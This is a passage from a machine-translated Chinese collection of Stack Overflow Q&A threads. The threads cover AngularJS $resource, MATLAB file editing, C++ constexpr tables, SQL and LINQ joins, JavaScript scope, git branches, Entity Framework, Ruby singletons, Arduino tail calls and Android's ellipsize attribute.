var User = $resource('/user/:userId', {userId:'@id'});
var user = User.get({userId:123}); 
```

这意味着当需要该属性时，您的 url 中的值将被用户对象中的属性`:userId`替换。`id`

那么什么时候需要呢？当您对现有用户做某事时，它是必需的，比如`get`ing 一个，更新一个。创建用户时不需要。

在大多数情况下，您希望在资源使用的 REST url 中至少有一个以 @ 为前缀的参数（可能是对象 ID）。如果你没有，这意味着为了保存一个对象的实例，你不需要知道它的存储位置。这意味着它是一个单例对象。也许像一个设置对象。

这是您期待已久的示例：

```
var User = $resource('/user/:userId/:dogName', {userId:'@id', dogName:@dog});
User.get({userId:123, dog:'Matt'}, function() { .. }) 
```

将产生请求：GET`/user/123/Matt`

# matlab - 如何在前几行之后插入一行文本

> ID：13313978
> 
> 赞同：0
> 
> 时间：2012-11-09T18:38:30.507
> 
> 标签：matlab

我知道如何在其他用户询问的文件开头插入一行文本，但我需要在 8 行之后在文件中插入一行。

```
dlmwrite('extract_f.txt',['first line' 13 10 fileread('extract_f2.txt')],'delimiter',''); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T20:23:01.777

您可以使用`fgetl`来阅读和跳过行。以下将尊重第 8 行之前的现有内容，并通过插入换行符来增加行索引，以在行数小于该行数时到达第 8 行：

```
fid = fopen('file.txt', 'r+t');
nLines = 8; l = 0;
while l < nLines
    l = l + 1;
    s = fgetl(fid); % read line
    if ~ischar(s)||isempty(s)
        fprintf(fid, '\n'); % skip empty lines and last 
    end    
end
fprintf(fid, 'this is line %i', nLines);
fclose(fid); 
```

# c++ - 在编译时使用 Constexpr 填充数组

> ID：13313980
> 
> 赞同：24
> 
> 时间：2012-11-09T18:38:40.500
> 
> 标签：c++, templates, c++11, constexpr

我想使用 constexpr 填充枚举数组。数组的内容遵循一定的模式。

我有一个枚举，将 ASCII 字符集分为四类。

```
enum Type {
    Alphabet,
    Number,
    Symbol,
    Other,
};

constexpr Type table[128] = /* blah blah */; 
```

我想要一个 128 的数组`Type`。它们可以在一个结构中。数组的索引将对应于 ASCII 字符，值将是`Type`每个字符的值。

所以我可以查询这个数组来找出一个 ASCII 字符属于哪个类别。就像是

```
char c = RandomFunction();
if (table[c] == Alphabet) 
    DoSomething(); 
```

我想知道如果没有一些冗长的宏黑客这是否可能。

目前，我通过执行以下操作来初始化表。

```
constexpr bool IsAlphabet (char c) {
    return ((c >= 0x41 && c <= 0x5A) ||
            (c >= 0x61 && c <= 0x7A));
}

constexpr bool IsNumber (char c) { /* blah blah */ }

constexpr bool IsSymbol (char c) { /* blah blah */ }

constexpr Type whichCategory (char c) { /* blah blah */ }

constexpr Type table[128] = { INITIALIZE }; 
```

`INITIALIZE`一些非常冗长的宏黑客的入口点在哪里。就像是

```
#define INITIALIZE INIT(0)
#define INIT(N) INIT_##N
#define INIT_0 whichCategory(0), INIT_1
#define INIT_1 whichCategory(1), INIT_2
//...
#define INIT_127 whichCategory(127) 
```

我想要一种方法来填充这个数组或包含数组的结构，而不需要这个宏黑客......

也许像

```
struct Table {
    Type _[128];
};

constexpr Table table = MagicFunction(); 
```

所以，问题是如何写这个`MagicFunction`？

**注意：**我知道 cctype 和 likes，这个问题更多的是 a`Is this possible?`而不是`Is this the best way to do it?`.

任何帮助，将不胜感激。

谢谢，

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2012-11-09T20:55:53.943

忽略*所有*问题，救援[指数：](http://loungecpp.net/cpp/indices-trick/)

```
template<unsigned... Is> struct seq{};
template<unsigned N, unsigned... Is>
struct gen_seq : gen_seq<N-1, N-1, Is...>{};
template<unsigned... Is>
struct gen_seq<0, Is...> : seq<Is...>{};

template<unsigned... Is>
constexpr Table MagicFunction(seq<Is...>){
  return {{ whichCategory(Is)... }};
}

constexpr Table MagicFunction(){
  return MagicFunction(gen_seq<128>{});
} 
```

[活生生的例子。](http://coliru.stacked-crooked.com/a/8672d1eb056cfd92)

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2017-10-16T21:44:36.570

在 C++17`::std::array`中已更新为更加`constexpr`友好，您可以执行与 C++14 中相同的操作，但没有一些看起来很吓人的 hack 来解决`constexpr`关键位置的不足。下面是代码的样子：

```
#include <array>

enum Type {
    Alphabet,
    Number,
    Symbol,
    Other,
};

constexpr ::std::array<Type, 128> MagicFunction()
{
   using result_t = ::std::array<Type, 128>;
   result_t result = {Other};
   result[65] = Alphabet;
   //....
   return result;
}

const ::std::array<Type, 128> table = MagicFunction(); 
```

再次`MagicFunction`仍然需要遵守相当宽松的`constexpr`规则。主要是它可能不会修改任何全局变量或使用`new`（这意味着修改全局状态，即堆）或其他类似的东西。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-11-09T21:12:11.137

恕我直言，最好的方法是简单地编写一个将为您生成的小型安装程序`table`。然后您可以丢弃安装程序，或者将其与生成的源代码一起签入。

这个问题的棘手部分只是另一个问题的重复：[是否可以使用模板元编程创建和初始化一个值数组？](https://stackoverflow.com/questions/2226291/is-it-possible-to-create-and-initialize-an-array-of-values-using-template-metapr)

诀窍是，不可能写出类似的东西

```
Type table[256] = some_expression(); 
```

在文件范围内，因为全局数组只能使用文字（源级）初始化列表进行初始化。你不能用`constexpr`函数的结果初始化一个全局数组，即使你能以某种方式让那个函数返回 a `std::initializer_list`，你不能这样做，因为它的构造函数没有声明`constexpr`。

因此，您需要做的是让编译器为您生成数组，方法是使其成为`static const`模板类的数据成员。在我太困惑而无法写出的一两个级别的元编程之后，您将在一行看起来像

```
template <int... Indices>
Type DummyStruct<Indices...>::table[] = { whichCategory(Indices)... }; 
```

哪里`Indices`是一个看起来像的参数包`0,1,2,... 254,255`。您可以使用递归辅助模板构建该参数包，或者可能只是使用 Boost 之外的东西。然后你可以写

```
constexpr Type (&table)[] = IndexHelperTemplate<256>::table; 
```

...但是，当表格只有 256 个条目，除非 ASCII 本身发生变化，否则您为什么要这样做？正确的方法*是*最简单的方法：预先计算所有 256 个条目并明确写出表格，无需模板、constexpr 或任何其他魔法。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2017-06-30T02:00:17.643

在 C++14 中执行此操作的方法如下所示：

```
#include <array>

enum Type {
    Alphabet,
    Number,
    Symbol,
    Other,
};

constexpr ::std::array<Type, 128> MagicFunction()
{
   using result_t = ::std::array<Type, 128>;
   result_t result = {Other};
   const result_t &fake_const_result = result;
   const_cast<result_t::reference>(fake_const_result[65]) = Alphabet;
   //....
   return result;
}

const ::std::array<Type, 128> table = MagicFunction(); 
```

不再需要聪明的模板黑客。不过，由于 C++14 并没有真正`constexpr`对标准库中的内容和不需要的内容进行足够彻底的审查，因此`const_cast`必须使用一个可怕的 hack。

当然，`MagicFunction`最好不要修改任何全局变量或以其他方式违反`constexpr`规则。但如今这些规则相当宽松。例如，您可以修改所需的所有局部变量，尽管通过引用传递它们或获取它们的地址可能效果不佳。

请参阅我对 C++17 的另一个答案，它可以让您放弃一些看起来很难看的黑客。

# mysql - 从三个表中检索数据

> ID：13313982
> 
> 赞同：1
> 
> 时间：2012-11-09T18:38:48.727
> 
> 标签：mysql, sql

我有三张桌子 pedidos 和 pro_pedidos 和 logos。我正在尝试从 numero.pedidos=nuumero.prod_pedidos 的 pedidos 获取数据。从徽标中我只想要列数据。这个查询没有任何错误，但什么也不显示，但我在表中有数据？

```
SELECT a.id, a.numero, a.nome, a.codigo, a.fantasia, a.cnpj, a.endereco,
a.telefone, a.uf, a.cidade, a.cep, a.bairro, a.casa_numero, a.complemento,
a.celular, a.ped,a.ped_numero, a.emissao, a.entraga, a.vendedor, a.prazo,
a.transportador, a.total, a.obs, a.ativo,
b.codigo AS Codigo, b.prod, b.preco, b.qtd, b.und,
b.total AS Total,b.subtotal, b.numero AS Numero,
c.nome AS emp_nome, c.telefone AS emp_tel,
c.celular AS emp_cel, c.fax AS emp_fax,
c.endereco AS emp_end, c.web AS emp_web,
c.email AS emp_email
FROM pedidos a INNER JOIN
prod_pedidos b ON a.numero = b.numero, logos c
WHERE        (a.numero = @numero) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-09T18:50:15.810

首先：[http ://dev.mysql.com/doc/refman/5.0/en/join.html](http://dev.mysql.com/doc/refman/5.0/en/join.html)

> 在没有连接条件的情况下，INNER JOIN 和 ,（逗号）在语义上是等效的：两者都在指定的表之间产生笛卡尔积（即，第一个表中的每一行都连接到第二个表中的每一行）。
> 
> 但是，逗号运算符的优先级低于 INNER JOIN、CROSS JOIN、LEFT JOIN 等。如果在存在连接条件时将逗号连接与其他连接类型混合使用，则可能会出现“on 子句”中的“未知列”“col_name”形式的错误。本节稍后将提供有关处理此问题的信息。

**结论：**在您的徽标表上使用内部连接而不是逗号，并添加连接条件，因为您目前正在做一个笛卡尔积。

* * *

但是，由于您没有任何结果，这也意味着没有有效的结果集

```
(a.numero = @numero) 
```

**结论：**因为您说表中有数据：

*   检查是否有实际`a.numero`对应`@numero`
*   检查您是否将正确的参数传递给`@numero`
*   检查您的参数是否`@numero`实现了预期的格式`a.numero`

希望有帮助，

S。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T18:54:41.967

问题可能是连接类型 - INNER JOIN 返回 a 和 b 表中的数据。如果数据仅在 a 中，或仅在 b 中，则不会返回。使用 LEFT 或 RIGHT 连接。

您还需要以某种方式链接到表 c - 徽标

```
SELECT a.id, a.numero, a.nome, a.codigo, a.fantasia, a.cnpj, a.endereco,
a.telefone, a.uf, a.cidade, a.cep, a.bairro, a.casa_numero, a.complemento,
a.celular, a.ped,a.ped_numero, a.emissao, a.entraga, a.vendedor, a.prazo,
a.transportador, a.total, a.obs, a.ativo,
b.codigo AS Codigo, b.prod, b.preco, b.qtd, b.und,
b.total AS Total,b.subtotal, b.numero AS Numero,
c.nome AS emp_nome, c.telefone AS emp_tel,
c.celular AS emp_cel, c.fax AS emp_fax,
c.endereco AS emp_end, c.web AS emp_web,
c.email AS emp_email
FROM pedidos a LEFT JOIN
prod_pedidos b ON a.numero = b.numero
LEFT JOIN logos c ON a.nome=c.nome
WHERE        (a.numero = @numero) 
```

# javascript - JS - 范围链

> ID：13313986
> 
> 赞同：-1
> 
> 时间：2012-11-09T18:38:56.637
> 
> 标签：javascript

我认为范围链会成为第一个“test = new test();” 工作，但它没有。为什么？

```
var tool = new Tool();
tool.init();

function Tool(){
    var test;

    function init(){
        //does not work, undefined
        test = new Test();

        //does work
        this.test=new Test();

        console.log(test);
    }
}

function Test(){
} 
```

**编辑：我的意思是不工作，它说测试是'未定义'**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T19:02:34.160

这很简单。您的`Tool`实例没有`init`方法。您代码中的`init`函数只是`Tool`构造函数的本地函数。`Tool`实例不继承此类功能。

如果您希望您的`Tool`实例有一个`init`方法，您可以：

1.  将其分配为构造函数中的方法：

    ```
    function Tool () {
        this.init = function () { ... };
    } 
    ```

2.  或将其分配给`Tool.prototype`（在构造函数之外！）：

    ```
    Tool.prototype.init = function () { ... }; 
    ```

第二个选项执行得更好，因为所有实例共享相同的`init`功能。（在第一个选项中，每个实例都有自己的`init`函数，该函数是在构造函数调用期间创建的。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-09T19:07:08.187

您是要`test`在 Tool 范围内访问，还是在它返回的对象上访问？它们是两个不同的变量。我将它们标记为 A 和 B：

```
var tool = new Tool();

function Tool(){
    var testA; // Private

    this.init = function(){
        testA = 1;

        this.testB = 9; // Public
    }

    this.getTestA = function(){ // Public method to access the private testA
        return testA;
    }

}

tool.init();

console.log( tool.getTestA() ); // 1
console.log( tool.testB ); // 9 
```

`testA`被称为私有变量，只能通过工具的方法访问，`testB`而是公共的。

这是否涵盖了您正在寻找的内容？

顺便说一句，如果您要创建很多 Tool 的实例，请记住使用 Tool 的原型来定义函数，这样您的代码会更节省内存，如下所示：

```
function Tool(){
    var testA;
}
Tool.prototype.init = function(){
    testA = 1;
    this.testB = 9;
}
Tool.prototype.getTestA = function(){  return testA; } 
```

# graphics - 用颜色显示 OBJ 文件

> ID：13313987
> 
> 赞同：1
> 
> 时间：2012-11-09T18:39:00.537
> 
> 标签：graphics, visualization, data-visualization, graph-visualization

我正在为我的程序读取 .obj 文件，并对它们进行曲率计算。目前的 .obj 文件是三角形网格，带有顶点和面。他们没有任何关联的 .mtl 文件。根据曲率，我必须为每个顶点分配一种颜色，并且所有顶点的颜色都不同。我现在想显示 .obj 文件，但我希望根据我分配给它们的颜色对顶点进行着色。显示此类文件的最佳方式是什么？

最初我想编写自己的 .mtl 文件并修改我的输入 .obj 文件。但由于顶点的数量约为 50000，每个顶点都有自己的颜色，因此指定一个包含 50000 种材料的 .mtl 文件似乎确实非常令人生畏。

我在某处读到 .ply 文件可以更轻松地处理颜色，但不知道如何去做。

提前感谢您的帮助。在可视化方面，我是新手。

# asp.net-mvc - LINQ to Entities 查询与在 MVC 应用程序中使用的内部连接方法

> ID：13313988
> 
> 赞同：1
> 
> 时间：2012-11-09T18:39:00.397
> 
> 标签：asp.net-mvc, linq, tsql

在我的 Person 表中有一个 RequestedLocation 列，它存储位置 ID。ID 与 Locations 表中的 LocationId 列相匹配，Locations 表在 LocatioName 列中也有文本位置名称。

在我看来，我需要在将 Person 模型传递给它的视图中显示字符串 LocationName。该视图将在 Telerik 网格中显示人员列表。目前它工作得很好，除了 RequestedLocation 列都是整数。

我正在使用包含 LINQ 查询的方法填充我的所有网格。这是当前有效的方法：

```
 public List<Person> GetPeople()
    {
        var query = from p in _DB.Person.ToList()
                    select p;

        return query.ToList();
    } 
```

这是正常的 SQL 查询，我需要转换为 LINQ：

```
SELECT ApplicantID
      ,FirstName
      ,LastName
      ,MiddleName
      ,DateofBirth
      ,Gender
      ,RequestedVolunteerRole
      ,RequestedVolunteerLocation
      ,l.LocationName
  FROM Form.Person p
  JOIN dbo.Location l ON p.RequestedVolunteerLocation = l.LocationID
  Order BY ApplicantID 
```

这是我转换为 LINQ 的尝试：

```
 public List<NewApplicantViewModel> GetPeople()
    {
        var query = from pl in _DB.Person.ToList()
                    join l in _Elig_DB.Locations.ToList() on pl.RequestedVolunteerLocation equals l.LocationID
                    select new
                    {
                        pl.RequestedVolunteerLocation = l.LocationName

                    };
        return query.ToList(); 
```

我从中得到的错误数量很多，但大多数都是这样的：

```
Cannot convert from type Annonymous to Type List<NewAPplicantModel> 
```

和

```
Invalid annonymous type declarator. 
```

请帮忙，感谢您阅读我的帖子。

哦，我只编程了几个月，所以如果我把这一切都搞错了，请告诉我。我唯一需要坚持的是表结构，因为它是我正在更新的现有应用程序，更改位置或人员表会产生很大的后果。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T18:42:35.997

您收到错误的原因是您正在投影匿名类型

```
 select new
                {
                    pl.RequestedVolunteerLocation = l.LocationName

                }; 
```

相反，您需要投影一个 NewApplicantViewModel

```
 select new NewApplicantViewModel
                {
                    RequestedVolunteerLocation = l.LocationName

                }; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-09T19:11:56.650

```
public List<NewApplicantViewModel> GetPeople()
{
    var query = from pl in _DB.Person
                join l in _Elig_DB.Locations on pl.RequestedVolunteerLocation 
                equals l.LocationID
                select new NewApplicantViewModel
                {
                    LocationName = l.LocationName,
                    otherPropery = p.Property
                };
    return query.ToList();
 } 
```

小心调用 _DB.Person.ToList() 它将从 DB 加载所有人员，因为 ToList() 立即执行查询并且连接将在内存中执行（而不是在 DB 中）。

# github - Git 分支和本地更改

> ID：13313991
> 
> 赞同：0
> 
> 时间：2012-11-09T18:39:27.073
> 
> 标签：github, git-branch, branching-and-merging

可以说我做一个`git checkout -b my_new_branch`. 对我的本地文件进行一些更改，然后添加所有文件`git add.`并提交并推送。之后我意识到我的分支搞砸了，我想删除它。

所以我回到我的主人那里`git checkout master`并用`git branch -D my_new_branch`.

是否会撤消所有本地更改？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T19:52:52.977

签出 master 分支后，您所做的所有更改都`my_new_branch`将不再位于您的工作目录中。它们仍将在您的分支和服务器上。

一旦你 delete `my_new_branch`，该分支的引用将被删除。在运行垃圾收集之前，提交仍将存在于您的本地存储库中。提交和分支也将仍然存在于远程服务器上。

# .net - 为什么我的项目中同时存在 EntityFramework 和 System.Data.Entity 程序集？

> ID：13313992
> 
> 赞同：2
> 
> 时间：2012-11-09T18:39:32.597
> 
> 标签：.net, entity-framework, visual-studio-2012

我刚刚打开 VS 2012 并创建了一个类库项目。之后，我`ADO.NET Entity Data Model`在我的解决方案中添加了一个新项目。

我注意到有一个名为 EntityFramework 5.0 的程序集和另一个名为 System.Data.Entity 4.0 的程序集。不应该只有一个吗？

作为奖励问题，当我单击文件时，设计器崩溃：

```
Error   2   Error 6039: warning CS1701: Assuming assembly reference 'System.Data.Entity, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089' matches 'System.Data.Entity, Version=4.2.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089', you may need to supply runtime policy
c:\Users\andre_pena\AppData\Local\Temp\5srvr0ge.0.cs(465,29) : error CS1061: 'System.Data.Metadata.Edm.EdmFunction' does not contain a definition for 'IsComposableAttribute' and no extension method 'IsComposableAttribute' accepting a first argument of type 'System.Data.Metadata.Edm.EdmFunction' could be found (are you missing a using directive or an assembly reference?)    c:\users\andre_pena\documents\visual studio 2012\Projects\ClassLibrary2\ClassLibrary2\Model1.edmx   1   1   ClassLibrary2 
```

我的系统一切正常吗？两个文件都存在正常吗？为什么我会收到此错误？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-09T19:11:35.483

你应该有两个程序集：

**EntityFramework.dll**（具有 DbContext API，代码优先）

**System.Data.Entity.dll**（具有 ObjectContext 和 DbContext API，新功能）

需要两个程序集是为了让 Entity Framework 团队无需等待 .NET Framework 的下一个正式版本即可发布更新。

`EdmFunction.IsComposableAttribute`在 .NET 4.5 中受支持，因此请检查 **System.Data.Entity.dll的版本**

![在此处输入图像描述](../Images/2cb137cc02321ced8d29557e55eee83b.png)

并在此处查看详细答案：[https ://stackoverflow.com/a/9694963/1241400](https://stackoverflow.com/a/9694963/1241400)

提示：

如果您想使用 lambda 并为**System.Data.Entity**`Include()`添加 using 指令。

 *** * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-09T19:37:51.537

关于：

```
Error   2   Error 6039: warning CS1701: Assuming assembly reference 'System.Data.Entity, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089' matches 'System.Data.Entity, Version=4.2.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089', you may need to supply runtime policy 
```

卸载实体框架 2011 年 6 月 CTP。我前段时间写了一篇博客：http: [//blog.3d-logic.com/2012/04/11/entity-framework-zombie-aka-microsoft-entity-framework-june-2011-ctp/](http://blog.3d-logic.com/2012/04/11/entity-framework-zombie-a-k-a-microsoft-entity-framework-june-2011-ctp/)否则它会困扰你到你的日子结束（或直到你铺好你的机器）。**

# ruby - 什么时候在 Ruby 中使用 Singleton 类是明智的？

> ID：13313993
> 
> 赞同：12
> 
> 时间：2012-11-09T18:39:34.373
> 
> 标签：ruby, singleton

我正在阅读有关 Ruby 中的单例的信息。我以前从来没有真正需要使用它们，但我很好奇并决定查找它们，看看我过去是否应该使用它们，或者如果我知道它们是*什么*，也许我将来可以使用它们用于。

我能想到使用它的唯一时间是：

*   **?** 当我需要一个特殊的对象时。示例：“智能”`Hash`对象，其行为类似于普通的 Ruby 哈希，但有一些额外的怪癖。
*   当我想让它只存在一个类的实例时。

但是，我不确定我是否需要上述任何一种。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-11-09T22:31:12.563

请注意，单例模块中的类混合在功能上等同于具有“类”方法的类或模块，并且可以保证初始化调用或内联初始化。比较 Singleton 的这种用法：

```
require 'singleton'
class Bar
  include Singleton
  attr_reader :jam
  def initialize
    @jam = 42
  end
  def double
    @jam *= 2
  end
end

b1 = Bar.instance
b1.double
b2 = Bar.instance
b2.double
p b1.jam          #=> 168 
```

使用这个无魔法的模块：

```
module Foo
  @jam = 42
  def self.double
    @jam *= 2
  end
  def self.jam
    @jam
  end
end

Foo.double
Foo.double
p Foo.jam          #=> 168 
```

在这两种情况下，您都有一个维护状态的全局对象。（因为您在全局范围内创建的每个常量，包括类和模块，都是一个全局对象。）

唯一的功能区别是`Singleton`您将对象的初始化延迟到您第一次请求它。

因此，如果您曾经在一个类或模块上拥有“类”方法，并且您使用这些方法来更改该对象的状态（例如，一个类跟踪从它继承的所有子类），那么您实际上是在使用单例。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-11-09T19:09:50.597

您在 Ruby 中一直使用单例类。事实上，每个对象都有一个单例类。（注意：出于性能原因，单例类实际上只在您第一次访问它们时创建，但这是一种性能优化。语义上，每次您尝试查看单例类时，它都会出现。）

例如，所谓的“类方法”实际上并不存在于 Ruby 中。它们只是类对象的单例类的常规实例方法。（改用“类方法”要容易得多。）

每次使用`def foo.bar`语法定义方法时，都会将方法添加到`foo`.

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-11-09T19:02:54.823

就像你说的，当你只需要一个类的实例时，就需要一个 Singleton 类。在广泛接受的框架中，Singleton 类的一个很好的例子是 Rails Logger 类。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-09T19:11:14.360

你的第二个要点是正确的。将单例类视为完全静态的对象。ruby 中的 Boolean 和 Null 对象就是示例。

# c - Arduino 是否支持尾调用消除？

> ID：13313994
> 
> 赞同：5
> 
> 时间：2012-11-09T18:39:41.457
> 
> 标签：c, arduino, tail-recursion, tail-call-optimization, tail-call

我想知道标准的 Arduino 环境是否支持尾调用消除……有人知道吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2016-11-25T11:17:43.773

在 Arduino IDE 中默认支持并启用尾调用消除。这对于微控制器世界来说是相当标准的，其中为了内存效率而牺牲了适当的堆栈帧等调试辅助工具。

这是一个测试：

```
const int RAM_SIZE_IN_BYTES = 2048;

void f(int i) {
  Serial.println(i);
  if(i == 0) return;
  else f(i-1);
}

void setup() {
  Serial.begin(9600);
  f(RAM_SIZE_IN_BYTES);
}

void loop() {
} 
```

此代码使用递归函数将 2048 到 0 的数字打印到控制台，该函数（没有尾调用优化）需要比可用 RAM 字节更多的嵌套调用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T18:41:56.383

大多数 C 编译器不支持尾调用消除。（这个概念不在 C 标准中）。

在非常有限的情况下，一些最近的 C 编译器可能支持它（仅在强优化时）。特别是 GCC（最新版本，如 4.6 或 4.7）。

您可以尝试一个简单的 C 函数并对其进行编译并查看生成的程序集。

# android - 椭圆在android中是什么意思？

> ID：13313996
> 
> 赞同：238
> 
> 时间：2012-11-09T18:39:53.140
> 
> 标签：android, android-layout, textview

我在`EditText`布局中添加了一个，并添加了一个提示，并使其水平居中。

运行应用程序时，提示是不可见的。我发现我应该使`ellipsize`价值`TextView`成为`start`：

```
<EditText
    android:id="@+id/number1EditText"
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:ellipsize="start"
    android:ems="10"
    android:gravity="center_horizontal"
    android:hint="@string/hint1" /> 
```

在 Android 文档中，我读到：

> 如果设置，会使长于视图宽度的单词变成
> 椭圆而不是在中间断开。

问题是`ellipsize`在字典中找不到。谁能向我解释我们可以通过`ellipsize`属性获得什么好处？`start`, `end`,之间有什么区别`middle`？

* * *

## 回答 #1

> 赞同：453
> 
> 时间：2012-11-09T18:45:50.207

* * *

## 回答 #2

> 赞同：78
> 
> 时间：2014-02-04T17:22:20.733

In my experience, Ellipsis works only if the below two attributes are set.

```
android:ellipsize="end"
android:singleLine="true" 
```

for the width of `TextView`, `wrap_content` or `match_parent` should both be good.

* * *

## 回答 #3

> 赞同：19
> 
> 时间：2015-04-06T05:36:51.147

`android:ellipsize` added in API Level 1\. An `ellipsis` is three periods in a row. (...) .

In your .xml

```
 <TextView
       ....
       android:text="Hi I am Amiyo, you can see how to ellipse works."
       android:ellipsize = "end" /> 
```

At this point, the ellipsis will not display yet as a `TextView` is set to automatically expand on default when new text is entered. You will need to limit `TextView` in some way. Do this, you can use either add to your `TextView` a `scrollHorizontally`, `minLines`, or `maxLines` to have the ellipsis display.

To make the ellipse:

```
 at the end: this is how it would.   
    use: android:ellipsize = "end" 
```

And

```
 in the middle:
 use: android:ellipsize = "middle" 
```

And

```
 at the start:
 use: android:ellipsize = "start" 
```

And

```
 to have no ellipse
 use: android:ellipsize = "none" 
```

Note Please :

```
Do not use android:singeLine = "true", it is deprecated.
android:maxLines = "1" will not display the three dots (...)
android:lines = "1" will not display the three dots (...) 
```

For more details you can visit [here](http://developer.android.com/reference/android/widget/TextView.html#attr_android%3Aellipsize)

* * *

## 回答 #4

> 赞同：10
> 
> 时间：2012-11-09T18:48:24.630

An [ellipsis](http://en.wikipedia.org/wiki/Ellipsis) is three periods in a row...

The TextView will use an ellipsis when it cannot expand to show all of its text. The attribute `ellipsized` sets the position of the three dots if it is necessary.

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2012-11-09T19:06:23.043

Text:

```
 This is my first android application and
 I am trying to make a funny game,
 It seems android is really very easy to play. 
```

Suppose above is your text and if you are using `ellipsize`'s `start` attribute it will seen like this

```
This is my first android application and
...t seems android is really very easy to play. 
```

with `end` attribute

```
 This is my first android application and
 I am trying to make a funny game,... 
```

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2019-03-07T01:44:59.793

Here is an example on how `ellipsize` works without using deprecated `android:singleLine="true"` in a `ConstraintLayout`:

```
<TextView
   android:layout_width="0dp"
   android:layout_height="wrap_content"
   android:textSize="13sp"
   android:ellipsize="end"
   android:maxLines="2"
   app:layout_constraintEnd_toEndOf="parent"
   app:layout_constraintStart_toStartOf="parent"
   tools:text="long long long long long long text text text" /> 
```

remember if you have a text that is supposed to be in a single line, then change the `maxLines` to 1.

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2013-12-27T15:16:33.037

Note: your text must be larger than the container box for the following to marquee:

```
 android:ellipsize="marquee" 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2013-12-31T12:34:18.507

Set this property to `EditText`. `Ellipsize` is working with disable `EditText`

```
android:lines="1"
android:scrollHorizontally="true"
android:ellipsize="end"
android:singleLine="true"
android:editable="false" 
```

or `setKeyListener(null);`

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2020-03-25T04:58:23.737

Use ellipsize when you have fixed width, then it will automatically truncate the text & show the ellipsis at end,

it Won't work if you set layout_width as wrap_content & match_parent.

```
android:width="40dp"
android:ellipsize="end"
android:singleLine="true" 
```